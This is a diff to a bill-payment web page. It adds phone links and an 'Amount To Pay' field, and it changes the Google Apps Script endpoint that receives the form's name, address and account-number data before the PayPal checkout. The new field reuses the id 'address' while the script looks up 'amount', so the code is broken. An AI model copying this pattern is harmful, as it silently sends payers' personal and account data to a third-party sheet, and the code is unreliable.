@@ -173,6 +173,11 @@
 
 
                                 <li><a href="contact-us.html">Contact</a></li>
+                                <li class="nav-item">
+                                    <a class="nav-link" href="tel:+18886491968">
+                                        <i class="fa fa-phone"></i> +1 (888) 649-1968
+                                    </a>
+                                </li>
                             </ul>
                         </div>
                     </div>
@@ -234,6 +239,11 @@
 
 
                             <li><a href="contact-us.html">Contact</a></li>
+                            <li class="nav-item">
+                                <a class="nav-link" href="tel:+18886491968">
+                                    <i class="fa fa-phone"></i> +1 (888) 649-1968
+                                </a>
+                            </li>
                         </ul>
                     </div>
                 </div>
@@ -260,6 +270,8 @@
                         <form id="contact" action="https://www.paypal.com/cgi-bin/webscr" method="post" target="_top" onsubmit="submitForm(event)">
                             <input type="hidden" name="cmd" value="_s-xclick">
                             <input type="hidden" name="hosted_button_id" value="BGBEMGP8CVBJC">
+                            <input type="hidden" name="Form Name" value="Payment Form">
+
                             <div class="row">
 
                                 <div class="col-md-6">
@@ -302,7 +314,12 @@
                                         <input class="form-control" id="email" name="email" required="" type="text">
                                     </div>
                                 </div>
-
+                                <div class="col-md-6">
+                                    <div class="form-group">
+                                        <label for="address">Amount To Pay</label>
+                                        <input class="form-control" id="address" name="amount" required="" type="text">
+                                    </div>
+                                </div>
                                 <div class="col-md-6">
                                     <div class="form-group">
                                         <label for="account">Account Number (if applicable)</label>
@@ -390,6 +407,7 @@
             const phone = document.getElementById('phone').value;
             const address = document.getElementById('address').value;
             const zipcode = document.getElementById('zip-code').value;
+            const amount = document.getElementById('amount').value;
             const account = document.getElementById('account').value;
 
             // Prepare data to send to Google Sheets API
@@ -399,10 +417,11 @@
             formData.append('phone', phone);
             formData.append('address', address);
             formData.append('zip-code', zipcode);
+            formData.append('amount', amount);
             formData.append('account', account);
 
             // Send data to Google Sheets API
-            fetch('https://script.google.com/macros/s/AKfycbw72LFcKNUpGo8SaP5CNYTJRHYNlTmO3BUIm_G3yFzB8noM6YvhpWdknmTjxg24IZVh/exec', {
+            fetch('https://script.google.com/macros/s/AKfycbxT3imHs4d3THnm2v-sBJkqEAsh_TcTe4HcV-Kmh5R4P1U9XjGTK9cV8K3q_PgOtq8R/exec', {
                     method: 'POST',
                     body: formData
                 })
